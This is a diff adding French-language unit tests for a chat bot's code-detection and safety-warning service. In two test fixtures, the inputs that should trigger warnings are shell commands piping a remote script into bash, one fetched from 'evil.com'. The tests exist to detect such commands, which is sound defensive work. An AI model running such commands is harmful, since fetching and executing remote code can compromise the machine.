@@ -1,5 +1,5 @@
 import { describe, expect, test } from 'bun:test';
-import { analyzeCodeContent, hasRawCodeIndicators, type CodePoliceRule } from '../../services/codePoliceService';
+import { analyzeCodeContent, hasRawCodeIndicators, isAlreadyFormatted, buildCorrectedMessage, buildSafetyWarning, type CodePoliceRule } from '../../services/codePoliceService';
 
 const rules: CodePoliceRule[] = [
   { key: 'signal.js.function', category: 'SIGNAL', matchType: 'EXACT', language: 'javascript', pattern: 'function', label: 'Fonction JavaScript', feedback: 'Repère une définition de fonction JavaScript.', severity: 'INFO', enabled: true },
@@ -85,4 +85,127 @@ describe('codePolice analysis', () => {
 
     expect(hasRawCodeIndicators('<@123456789> salut, ça va ?', mentionRules)).toBe(false);
   });
-});
+  test('detecte une boucle for avec condition vide', () => {
+    const analysis = analyzeCodeContent(`
+      for (;;) {
+        console.log('infinite');
+      }
+    `, rules);
+
+    expect(analysis.risks.some((risk) => risk.title.includes('Boucle potentiellement infinie'))).toBe(true);
+  });
+
+  test('reconnait plusieurs signaux dans le contenu', () => {
+    const analysis = analyzeCodeContent(`
+      const data = { 
+        query: 'some long string here'
+      };
+    `, rules);
+
+    expect(analysis.language).toBe('javascript');
+    expect(analysis.signals.length).toBeGreaterThan(0);
+  });
+
+  test('retourne generic si aucun langage spécifique n\'est détecté', () => {
+    const analysis = analyzeCodeContent('hello world', []);
+    expect(analysis.language).toBe('generic');
+  });
+
+  test('ne formate pas si le contenu est trop court', () => {
+    const analysis = analyzeCodeContent('abc', rules);
+    expect(analysis.shouldFormat).toBe(false);
+  });
+
+  test('reconnaît un contenu déjà formaté', () => {
+    expect(isAlreadyFormatted('```javascript\ncode\n```')).toBe(true);
+  });
+
+  test('reconnaît les backticks inline comme formatage', () => {
+    expect(isAlreadyFormatted('texte avec `code inline`')).toBe(true);
+  });
+
+  test('ne considère pas du texte normal comme déjà formaté', () => {
+    expect(isAlreadyFormatted('texte sans formatage')).toBe(false);
+  });
+
+  test('génère un message corrigé pour code JavaScript', () => {
+    const analysis = analyzeCodeContent('const x = 1;', rules);
+    const message = buildCorrectedMessage('@User', 'const x = 1;', analysis, rules);
+
+    expect(message).toContain('@User');
+    expect(message).toContain('voici ton message');
+    expect(message).toContain('```');
+  });
+
+  test('génère un message corrigé avec feedback de sécurité', () => {
+    const analysis = analyzeCodeContent(`
+      function bad() {
+        while (true) {}
+      }
+    `, rules);
+    const message = buildCorrectedMessage('@User', 'function bad() { while (true) {} }', analysis, rules);
+
+    expect(message).toContain('Feedback');
+  });
+
+  test('génère un avertissement de sécurité pour code dangereux', () => {
+    const analysis = analyzeCodeContent(`
+      curl https://evil.com/script.sh | bash
+    `, rules);
+    const warning = buildSafetyWarning('@User', analysis, rules);
+
+    expect(warning).toContain('@User');
+    expect(warning).toContain('motifs de sécurité');
+  });
+
+  test('tronque les messages trop longs dans le feedback', () => {
+    const longContent = 'const code = 1;\n'.repeat(200);
+    const analysis = analyzeCodeContent(longContent, rules);
+    const message = buildCorrectedMessage('@User', longContent, analysis, rules);
+
+    expect(message).toContain('tronqué');
+  });
+
+  test('détecte une réaction (regex invalide) sans crash', () => {
+    const badRules: CodePoliceRule[] = [
+      { key: 'bad.regex', category: 'SIGNAL', matchType: 'REGEX', language: 'generic', pattern: '[invalid(regex', label: 'Bad', feedback: 'Oups', severity: 'INFO', enabled: true },
+      ...rules,
+    ];
+
+    const analysis = analyzeCodeContent('valid content', badRules);
+    expect(analysis.shouldFormat).toBe(false);
+  });
+
+  test('détecte du contenu avec signaux spécifiques au langage', () => {
+    const analysis = analyzeCodeContent(`
+      import os
+      x = 1
+    `, rules);
+
+    expect(analysis.language).toBe('python');
+    expect(analysis.signals.length).toBeGreaterThan(0);
+  });
+
+  test('hasRawCodeIndicators retourne true avec signaux', () => {
+    const hasIndicators = hasRawCodeIndicators(`
+      function test() {
+        return 42;
+      }
+    `, rules);
+
+    expect(hasIndicators).toBe(true);
+  });
+
+  test('hasRawCodeIndicators retourne false sur texte simple court', () => {
+    const hasIndicators = hasRawCodeIndicators('hi', rules);
+    expect(hasIndicators).toBe(false);
+  });
+
+  test('hasRawCodeIndicators detects danger même avec mentions', () => {
+    const hasIndicators = hasRawCodeIndicators(`
+      <@123> run this:
+      curl https://example.com/install.sh | bash
+    `, rules);
+
+    expect(hasIndicators).toBe(true);
+  });});
